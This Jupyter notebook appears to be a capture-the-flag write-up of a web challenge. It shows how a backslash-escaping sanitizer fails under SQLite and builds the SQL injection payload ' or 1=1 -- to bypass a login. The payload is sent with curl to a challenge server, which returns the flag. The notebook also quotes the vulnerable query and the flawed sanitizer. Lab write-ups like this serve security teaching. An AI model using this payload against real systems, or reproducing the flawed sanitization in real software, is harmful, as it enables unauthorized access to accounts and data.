{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "b3662a74",
   "metadata": {},
   "source": [
    "# Challenge \n",
    "\n",
    "Overcome this sanitization:\n",
    "\n",
    "```python\n",
    "def sanitize(string):\n",
    "    return string.replace(\"'\", \"\\\\'\").replace('\"', '\\\\\"')\n",
    "```\n",
    "\n",
    "to force a sql injection here:\n",
    "\n",
    "```python\n",
    "        res = run(f\"SELECT username, password FROM Users WHERE username='{username}' AND password='{password}';\")\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "56161725",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<html>who r u</html>"
     ]
    }
   ],
   "source": [
    "!curl -X POST \"localhost:8999/login\" -F \"username=test\" -F \"password=test\""
   ]
  },
  {
   "cell_type": "markdown",
   "id": "221a0d24",
   "metadata": {},
   "source": [
    "# Lets try with sql map :)\n",
    "\n",
    "- it is SQLLite3"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "ae95d38c",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Note: Unnecessary use of -X or --request, POST is already inferred.\n",
      "02:25:53.310951 [0-0] * Host localhost:8999 was resolved.\n",
      "02:25:53.311004 [0-0] * IPv6: ::1\n",
      "02:25:53.311011 [0-0] * IPv4: 127.0.0.1\n",
      "02:25:53.311019 [0-0] * [SETUP] added\n",
      "02:25:53.311064 [0-0] *   Trying [::1]:8999...\n",
      "02:25:53.311223 [0-0] * Connected to localhost (::1) port 8999\n",
      "02:25:53.311239 [0-0] * using HTTP/1.x\n",
      "02:25:53.311359 [0-0] > POST /login HTTP/1.1\n",
      "02:25:53.311359 [0-0] > Host: localhost:8999\n",
      "02:25:53.311359 [0-0] > User-Agent: curl/8.12.1\n",
      "02:25:53.311359 [0-0] > Accept: */*\n",
      "02:25:53.311359 [0-0] > Content-Length: 266\n",
      "02:25:53.311359 [0-0] > Content-Type: multipart/form-data; boundary=------------------------S0Sx9uekcIk1sRhr7s3GY1\n",
      "02:25:53.311359 [0-0] > \n",
      "02:25:53.311445 [0-0] * upload completely sent off: 266 bytes\n",
      "02:25:53.316638 [0-0] < HTTP/1.1 200 OK\n",
      "02:25:53.316813 [0-0] < Server: Werkzeug/3.1.3 Python/3.13.3\n",
      "02:25:53.316901 [0-0] < Date: Tue, 13 May 2025 00:25:53 GMT\n",
      "02:25:53.316935 [0-0] < Content-Type: text/html; charset=utf-8\n",
      "02:25:53.316973 [0-0] < Content-Length: 20\n",
      "02:25:53.317006 [0-0] < Connection: close\n",
      "02:25:53.317053 [0-0] < \n",
      "02:25:53.317100 [0-0] * shutting down connection #0\n",
      "02:25:53.317137 [0-0] * [SETUP] shut down successfully\n",
      "02:25:53.317174 [0-0] * [SETUP] close\n",
      "02:25:53.317254 [0-0] * [SETUP] destroy\n",
      "<html>who r u</html>"
     ]
    }
   ],
   "source": [
    "!curl -vv -X POST \"localhost:8999/login\" -F \"username=test\" -F \"password=test\" 2>&1 "
   ]
  },
  {
   "cell_type": "markdown",
   "id": "32de8ef4",
   "metadata": {},
   "source": [
    "=> Nope, does not work that well, atleast with this setup so let's get manual again"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "062bf3c6",
   "metadata": {},
   "source": [
    "# Manual SQLi\n",
    "\n",
    "From the [documentation](https://www.sqlite.org/lang_expr.html)\n",
    "\n",
    "```\n",
    "C-style escapes using the backslash character are not supported because they are not standard SQL. \n",
    "```\n",
    "\n",
    "Therefore, `password='` results into\n",
    "\n",
    "```python\n",
    "        res = run(f\"SELECT username, password FROM Users WHERE username='{username}' AND password='\\'';\")\n",
    "```\n",
    "This literally checks if `password=\"\\\"`. So we can push characters afterwards.\n",
    "\n",
    "\n",
    "The return statement checks that the username must be `roo`. In that case, we do not need any injection at all, so let's just focus on the end:\n",
    "\n",
    "Therefore, `password=' or 1=1 --` results into\n",
    "\n",
    "```python\n",
    "        res = run(f\"SELECT username, password FROM Users WHERE username='roo' AND password='\\' or 1=1 --';\")\n",
    "```\n",
    "\n",
    "which is all we need."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "id": "e4f0403f",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<html>ictf{baby's_first_time_writing_web!_NDy3MOvyplcw}</html>"
     ]
    }
   ],
   "source": [
    "!curl -X POST \"http://155.248.210.243:42380/login\" -F \"username=roo\" -F \"password=' or 1=1 --\""
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a67481fa",
   "metadata": {},
   "source": [
    "# Other TIL\n",
    "\n",
    "- Use flask in `debug`-mode and use a mount for a hot edit:\n",
    "\n",
    "\n",
    "```\n",
    "docker run -d -p 8999:8000 -v \"$PWD:/srv\" may-san\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "48aa9aae",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "73b57958",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "sage",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.9"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
